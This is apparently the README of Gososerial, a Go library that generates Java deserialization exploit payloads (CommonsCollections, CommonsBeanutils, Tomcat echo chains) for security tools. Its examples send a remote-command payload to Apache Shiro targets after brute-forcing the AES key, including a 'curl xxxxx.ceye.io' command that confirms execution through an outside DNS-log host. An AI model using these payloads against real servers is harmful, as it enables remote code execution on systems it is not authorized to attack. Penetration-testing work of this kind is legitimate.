# Gososerial

## 介绍

- ysoserial是java反序列化安全方面著名的工具
  
- 无需java环境，无需下载ysoserial.jar文件
  
- 输入命令直接获得payload，方便编写安全工具

- 目前已支持CC1-CC7，K1-K4和CB1链

- 支持K1和K2的TomcatEcho，HTTP头可自行取名

## Introduce

- Ysoserial is a well-known tool for Java deserialization security

- No Java environment and no need to download ysoserial.jar file

- Enter the command to directly obtain the payload, which is convenient for writing security tools

- Support CommonsCollections1-7, K1-K4, CommonsBeanutils1 now

- Support TomcatEcho K1-K2, and the HTTP header name can be edited

## Example

CommonsCollections1 Payload

![](https://github.com/EmYiQing/Gososerial/blob/master/img/1.png)


List of Supported

![](https://github.com/EmYiQing/Gososerial/blob/master/img/2.png)

## Quick Start

```shell
go get github.com/EmYiQing/Gososerial
```

```go
package main

import gososerial "github.com/EmYiQing/Gososerial"

func main()  {
	payload := gososerial.GetCC1("calc.exe")
	......
	sendPayload(payload)
	......
}
```

TomcatEcho

```go
// Testecho: expr 10 '*' 10 -> expr 10 '*' 10
// Testcmd: expr 10 '*' 10 -> 100
payload := gososerial.GetCCK2TomcatEcho("Testecho", "Testcmd")

req.Cookie = payload
req.Header["Testecho"] = "gososerial"
req.Method = "POST"
resp := httputil.sendRequest(req)

if resp.Header["Testecho"] == "gososerial" {
	log.Info("find tomcat echo")
}
```

Example

```go
func main() {
	// Shiro Scan Code
	target := "http://shiro_ip/"
	// Brust Shiro AES Key 
	key := shiro.CheckShiroKey(target)
	if key != "" {
		log.Info("find key: %s", key)
	}
	// Use CommonsCollections5 Payload
	var payload []byte
	payload = gososerial.GetCC5("curl xxxxx.ceye.io")
	// Send Cookies Encrypted By AES
	shiro.SendPayload(key, payload, target)
	// Receive Results Using Dnslog API
	if ceye.CheckResult("your_ceye_token") {
		log.Info("find shiro!")
	}
}
```

## About

参考了xray中p师傅的代码

**ysoserial**: https://github.com/frohoff/ysoserial

**xray**: https://github.com/chaitin/xray

**phith0n**: https://github.com/phith0n

## 免责申明

未经授权许可使用Gososerial攻击目标是非法的

本程序应仅用于授权的安全测试与研究目的。
